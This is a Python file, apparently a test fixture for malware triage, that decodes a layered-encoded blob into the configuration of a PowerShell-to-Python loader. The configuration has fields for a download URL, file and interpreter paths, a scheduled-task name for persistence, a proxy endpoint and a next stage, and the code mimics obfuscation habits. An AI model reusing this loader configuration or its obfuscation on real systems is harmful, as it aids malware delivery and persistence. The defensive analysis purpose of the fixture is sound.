# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_2ad817b6 = "bDMocmlqW2ZpM2ZoZVxfYltVXmVpaiJXWWdrX2hbVWhbY2VqWyJaW1llWltVW2NYW1paW1oibWhfaltVXF9iWyJaX2lmV2pZXlVmaGVZW2lpcldaV2ZqW2gzZmVtW2hpXltiYlVmb2peZWRVXldkWmVcXHJpalddW1VZZWtkajMrcmlvZGpXbjNaX1lqX2VkV2hvVVpfaWZXallecmVYXGtpWVdqX2VkM2hbXGJbWWpfbFtVZFdjW1VmYldkcllXaGhfW2gzZm9XaGNlaFVmb19kaWpXYmJbaHJtX2RaZW1pVVleV19kM2ZlbVtoaV5bYmJVamVVZm9qXmVkcllXY2ZXX11kVV9aM1lXY2ZXX11kI1hYLyYsLCovXC9ya2hiM15qamZpMCUlWFgvJiwsKi9cLyRbbldjZmJbJF9kbFdiX1olWicvKCtbKyokZm9ya2lbaFVXXVtkajM+a2RqaFtpaUZval5lZCVYWC8mLCwqL1wvclxfYltVZldqXjM5MCVGaGVdaFdjOldqVyU+a2RqaFtpaUJXWCUka2ZaV2pbI1hYLyYsLCovXC8kZm9yX2RqW2hmaFtqW2hVZldqXjM5MCVGaGVdaFdjOldqVyVGb2peZWQjWFgvJiwsKi9cLyVmb2peZWQkW25bcmpXaWFVZFdjWzNJb2lqW2NLZlpXalsjWFgvJiwsKi9cL3JmaGVub1VbZFpmZV9kajMnKC0kJiQmJCcwJy4mJyxyZFtualVpalddWzNiZVlXYiNaX2lmV2pZXiRYV2pyXldkWmVcXFVfWjNGSUZPIzovLS0sLiY6Jy8mPDkqODo="
CODEC_2ad817b6 = "base64_literal|subtract_modulo_256|0a"

def load_2ad817b6():
    return base64.b64decode(MATERIAL_2ad817b6)

def decode_2ad817b6(EnCoDeD_Bytes):
    return bytes((value + 10) % 256 for value in EnCoDeD_Bytes)

def recover_2ad817b6():
    NeUtRaL = (3, 5, 8, 13)[1:3]
    _pass = 0
    while _pass < 1:
        DeCoDeD_Bytes = decode_2ad817b6(load_2ad817b6())
        _pass += 1
    DeScRiPtOr_Text = DeCoDeD_Bytes.decode("ascii", "strict")
    return DeScRiPtOr_Text

def inspect_2ad817b6():
    return recover_2ad817b6()

def surface_2ad817b6():
    routes = {"selected": lambda: ("dictionary_dispatch", "reflective_name_plan", "pyarmor_pyinstaller", "powershell_to_python")}
    return routes["selected"]()

def obfuscation_2ad817b6():
    reflection_plan = ("__import__", "getattr", "reflective_name_plan")
    return reflection_plan[-1]

def plan_2ad817b6():
    fields = dict(item.split("=", 1) for item in inspect_2ad817b6().split("|"))
    analysis_surface = surface_2ad817b6()
    obfuscation_surface = obfuscation_2ad817b6()
    operation_plan = ("powershell_python_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_2ad817b6())

# reconstruction complete